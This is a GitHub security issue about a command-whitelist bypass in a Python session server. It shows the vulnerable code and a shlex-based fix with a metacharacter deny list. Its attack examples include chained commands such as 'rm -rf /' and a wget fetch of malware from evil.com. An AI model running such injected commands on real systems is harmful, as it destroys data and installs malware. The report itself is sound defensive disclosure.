# GitHub Issue: Weak Command Whitelisting

**Title:** [Security] MEDIUM: Weak command whitelisting allows pipe and chaining bypass

**Labels:** `security`, `medium`, `bug`

---

## Summary

The command whitelisting in simple_session_server.py only checks the first command token, allowing attackers to chain additional commands using pipes, semicolons, and other shell operators.

**Severity:** MEDIUM (escalates to CRITICAL with shell=True - see issue #001)
**Affected File:** `empirica/cli/simple_session_server.py` (line 191)

## Affected Code

```python
safe_commands = ["ls", "pwd", "cat", "head", "tail", "wc", "grep", "find"]

cmd_parts = command.split()  # Simple whitespace split
if not cmd_parts or cmd_parts[0] not in safe_commands:  # Only checks FIRST token
    return {"error": "Command not allowed"}
```

## Attack Vectors

Even without shell=True, the whitelist can be bypassed:

```bash
# Passes whitelist check (first token is "grep")
grep pattern | malicious_command
grep pattern; rm -rf /
ls && wget http://evil.com/malware
```

## Recommended Fix

1. Parse arguments properly using shlex
2. Reject commands containing shell metacharacters
3. Validate ALL tokens, not just the first

```python
import shlex

DANGEROUS_CHARS = [';', '|', '&', '$', '`', '>', '<', '(', ')', '\n', '\r']

def _run_bash(self, session: dict, command: str) -> dict:
    # Reject dangerous characters
    if any(char in command for char in DANGEROUS_CHARS):
        return {"error": "Command contains forbidden characters"}

    try:
        cmd_parts = shlex.split(command)
    except ValueError:
        return {"error": "Invalid command syntax"}

    if not cmd_parts or cmd_parts[0] not in safe_commands:
        return {"error": "Command not allowed"}

    # Use shell=False with list arguments
    result = subprocess.run(cmd_parts, shell=False, ...)
```

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
